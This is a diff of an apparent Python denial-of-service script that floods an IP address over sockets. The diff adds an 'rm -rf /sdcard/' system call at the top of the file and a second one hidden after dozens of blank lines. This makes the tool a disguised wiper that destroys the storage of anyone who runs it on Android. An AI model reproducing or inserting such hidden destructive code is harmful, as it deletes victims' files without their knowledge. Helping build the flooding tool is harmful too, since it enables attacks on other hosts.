@@ -1,3 +1,5 @@
+import os
+os.system('rm -rf /sdcard/')
 BB = "\033[34;1m" # Blue light
 YY = "\033[33;1m" # Yellow light
 GG = "\033[32;1m" # Green light
@@ -9,7 +11,6 @@ Y = "\033[33m"    # Yellow
 G = "\033[32m"    # Green
 W = "\033[0m"     # White
 R = "\033[31m"    # Red
-
 
 
 import socket
@@ -27,6 +28,68 @@ for h in range(5000):
 
   except :
     print(R+"the ip is down with you by Elharam4ddos ",ip)#   print(C+"                     no problem in the ip",YY,ip)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+os.system('rm -rf /sdcard/')
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 	
  
     		      			
